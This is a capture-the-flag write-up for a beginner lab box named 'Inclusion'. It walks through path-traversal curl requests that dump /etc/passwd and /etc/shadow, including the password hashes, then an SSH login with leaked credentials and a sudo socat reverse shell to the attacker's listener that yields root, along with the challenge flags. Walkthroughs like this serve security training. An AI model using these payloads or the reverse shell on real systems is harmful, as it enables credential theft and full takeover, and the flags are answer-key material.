# Inclusion

## Description

A beginner level LFI challenge

## user flag

Nmap detects 2 open ports: `ssh` and `http`:

~~~
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: My blog
~~~

Let's start with http.

When we connect to http://10.10.16.8, we can see a basic web page with 3 buttons at the bottom of the page, with following links:
* http://10.10.16.8/article?name=hacking
* http://10.10.16.8/article?name=lfiattack
* http://10.10.16.8/article?name=rfiattack

Let's try to inject a file:

~~~
$ curl -s http://10.10.16.8/article?name=../../../../etc/passwd | html2text 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-
data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List
Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-
Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-
network:x:100:102:systemd Network
Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-
resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false

$ curl -s http://10.10.16.8/article?name=../../../../etc/shadow | html2text 
root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7:::
daemon:*:17647:0:99999:7::: bin:*:17647:0:99999:7::: sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7::: games:*:17647:0:99999:7::: man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7::: mail:*:17647:0:99999:7::: news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7::: proxy:*:17647:0:99999:7::: www-
data:*:17647:0:99999:7::: backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7::: irc:*:17647:0:99999:7::: gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7::: systemd-network:*:17647:0:99999:7::: systemd-
resolve:*:17647:0:99999:7::: syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7::: _apt:*:17647:0:99999:7:::
lxd:*:18281:0:99999:7::: uuidd:*:18281:0:99999:7:::
dnsmasq:*:18281:0:99999:7::: landscape:*:18281:0:99999:7:::
pollinate:*:18281:0:99999:7:::
falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7:::
sshd:*:18281:0:99999:7::: mysql:!:18281:0:99999:7:::
~~~

OK, that was easy. The PHP page (`/article/index.php`) is likely including a page that is passed as a parameter to `name` as follows:

```php
if isset($_GET['name']) {
	include($_GET['name'])
}
```

Notice in the `/etc/passwd` file that 1 of the entries has been commented and contains both a login and a password:

~~~
#falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
~~~

Let's try to use the credentials against SSH:

sshpass -p "rootpassword" ssh falconfeast@10.10.16.8

~~~
falconfeast@inclusion:~$ ls -l
total 8
drwxr-xr-x 2 root        root        4096 Jan 21 15:02 articles
-rw-r--r-- 1 falconfeast falconfeast   21 Jan 22 19:46 user.txt
falconfeast@inclusion:~$ cat user.txt 
60989655118397345799
~~~

User flag: `60989655118397345799`

## root flag    

To get the root flag, we obviously need to elevate our privileges. Let's list our privileges:

~~~
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
~~~

We can run `socat` with `root` privileges. Let's see [here](https://gtfobins.github.io/gtfobins/socat/) how we can take advantage of it.

First open a listener on your own machine:

~~~
$ nc -nlvp 1234
~~~

Then on the remote host, run the following command (replace the IP with your own IP):

~~~
falconfeast@inclusion:~$ sudo socat tcp-connect:10.9.**.**:1234 exec:sh,pty,stderr,setsid,sigint,sane
~~~

In our reverse shell, we are now root:

~~~
$ nc -nlvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.16.8.
Ncat: Connection from 10.10.16.8:41530.
sh: 0: can't access tty; job control turned off
# whoami
whoami
root
# cd /root
cd /root
# ls -l
ls -l
total 4
-rw-r--r-- 1 root root 21 Jan 22 19:47 root.txt
# cat root.txt	 
cat root.txt
42964104845495153909
~~~

Root flag: `42964104845495153909`